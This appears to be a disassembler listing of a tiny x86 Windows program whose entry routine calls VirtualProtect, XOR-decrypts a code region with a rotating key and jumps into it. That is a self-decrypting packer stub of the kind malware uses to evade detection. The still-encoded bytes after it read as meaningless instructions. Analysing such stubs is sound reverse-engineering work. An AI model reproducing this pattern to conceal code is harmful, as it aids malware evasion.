0x004011f8:	xorl	%eax, (%edi)	; from: 0x0040163d(MAY)
0x004011fa:	popl	%esi
0x004011fb:	jo	0x004011a6	; targets: 0x004011fd(MAY)
0x004011fd:	fxam		; from: 0x004011fb(MAY)
0x004011ff:	andb	$0xffffffbe, %al
0x00401201:	xchgl	%eax, %ebx
0x00401202:	incl	%eax
0x00401203:	outb	%al, $0xffffff8a
0x00401205:	js	0x0040127b	; targets: 0x0040127b(MAY), 0x00401207(MAY)
0x00401207:	imulb	%al, %al	; from: 0x00401205(MAY)
0x00401209:	call	0x5ddf549c	; targets: 0x5ddf549c(MAY)
0x0040127b:	int	$0xffffff8a	; from: 0x00401205(MAY)
0x0040127d:	rcll	$0x33, %esi
0x00401280:	xchgl	%ebx, %ds:-1701813943(%ebp)

start:
0x00401608:	movl	$0x178c5b64, %edx
0x0040160d:	roll	$0x4, %edx
0x00401610:	pushl	%edx
0x00401611:	leal	0x00401000, %ebx
0x00401617:	movl	$0x608, %ecx
0x0040161c:	pushl	%ecx
0x0040161d:	pushl	$0x403000
0x00401622:	pushl	$0x40
0x00401624:	pushl	$0x753
0x00401629:	pushl	%ebx
0x0040162a:	call	0x00401652	; targets: 0x00401652(MAY)
0x0040162f:	popl	%ecx
0x00401630:	popl	%edx
0x00401631:	xorb	%dl, (%ebx)	; from: 0x00401636(MAY)
0x00401633:	roll	%cl, %edx
0x00401635:	incl	%ebx
0x00401636:	loopne	0x00401631	; targets: 0x00401631(MAY), 0x00401638(MAY)
0x00401638:	pushl	$0x4011f8	; from: 0x00401636(MAY)
0x0040163d:	ret	; targets: 0x004011f8(MAY)

0x00401652:	jmp	VirtualProtect@kernel32.dll	; targets: 0xff000030(MAY)	; from: 0x0040162a(MAY)
